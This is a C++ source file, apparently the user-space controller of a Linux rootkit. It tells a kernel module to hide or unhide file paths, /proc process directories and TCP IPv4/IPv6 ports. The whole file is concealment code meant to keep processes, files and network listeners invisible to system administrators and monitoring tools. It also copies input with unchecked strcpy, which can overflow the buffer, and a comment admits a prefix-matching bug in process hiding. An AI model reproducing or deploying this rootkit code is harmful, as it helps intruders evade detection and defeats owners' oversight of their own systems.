#include "hider.h"

#include "../kernel_access/kernel_access.h"

#include <cstring>
#include <string>

void hide_absolute_path(const char *path) {
    msg_to_module msg;
    memset(&msg, '\x00', sizeof(msg));

    msg.id = OPER_ADD_HIDDEN_PATH;
    strcpy(msg.data, path);

    kernelAccess.my_send_msg(msg);
}

void unhide_absolute_path(const char *path) {
    msg_to_module msg;
    memset(&msg, '\x00', sizeof(msg));

    msg.id = OPER_REMOVE_HIDDEN_PATH;
    strcpy(msg.data, path);

    kernelAccess.my_send_msg(msg);
}

void hide_process_dir(int pid) {
    std::string path = "/proc/" + std::to_string(pid);
    // todo
    // if there is not ending forward slash to the path, it is possible that the path /proc/123 will be hidden and
    // because of that the path /proc/1234 will also be considered hidden, although it is not

    hide_absolute_path(path.c_str());
}

void unhide_process_dir(int pid) {
    std::string path = "/proc/" + std::to_string(pid);

    unhide_absolute_path(path.c_str());
}

void hide_tcp4_port(int port) {
    msg_to_module msg;
    memset(&msg, '\x00', sizeof(msg));

    msg.id = OPER_ADD_HIDDEN_TCP4_PORT;
    memcpy(msg.data, (void*) &port, sizeof(PORT));

    kernelAccess.my_send_msg(msg);
}

void unhide_tcp4_port(int port) {
    msg_to_module msg;
    memset(&msg, '\x00', sizeof(msg));

    msg.id = OPER_REMOVE_HIDDEN_TCP4_PORT;
    memcpy(msg.data, &port, sizeof(PORT));

    kernelAccess.my_send_msg(msg);
}

void hide_tcp6_port(int port) {
    msg_to_module msg;
    memset(&msg, '\x00', sizeof(msg));

    msg.id = OPER_ADD_HIDDEN_TCP6_PORT;
    memcpy(msg.data, (void*) &port, sizeof(PORT));

    kernelAccess.my_send_msg(msg);
}

void unhide_tcp6_port(int port) {
    msg_to_module msg;
    memset(&msg, '\x00', sizeof(msg));

    msg.id = OPER_REMOVE_HIDDEN_TCP6_PORT;
    memcpy(msg.data, &port, sizeof(PORT));

    kernelAccess.my_send_msg(msg);
}

